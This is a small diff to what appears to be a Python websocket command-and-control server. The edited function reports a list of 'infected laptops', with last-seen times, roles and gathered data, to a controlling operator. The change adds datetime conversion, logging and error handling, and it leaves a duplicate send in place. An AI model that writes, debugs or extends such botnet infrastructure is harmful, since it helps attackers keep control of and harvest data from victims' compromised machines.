@@ -164,14 +164,27 @@ async def handle_response(data):
 
 # Send the list of clients to the controller
 async def send_client_list(websocket):
+    # Convert datetime to ISO 8601 strings before sending
     clients_list = {
         client_id: {
-            'last_seen': client['last_seen'],
+            'last_seen': client['last_seen'].isoformat(),  # Convert datetime to string
             'role': client['role'],
             'data': client.get('data', {})
         }
         for client_id, client in clients.items()
     }
+
+    response = {
+        'type': 'infected_list',
+        'infected_laptops': clients_list
+    }
+
+    # Send the JSON response back to the controller
+    try:
+        await websocket.send(json.dumps(response))
+        logger.info("Sent client list to controller.", extra={"clients_list": clients_list})
+    except Exception as e:
+        logger.error(f"Error sending client list: {e}", exc_info=True)
 
     response = {'type': 'infected_list', 'infected_laptops': clients_list}
     await websocket.send(json.dumps(response))
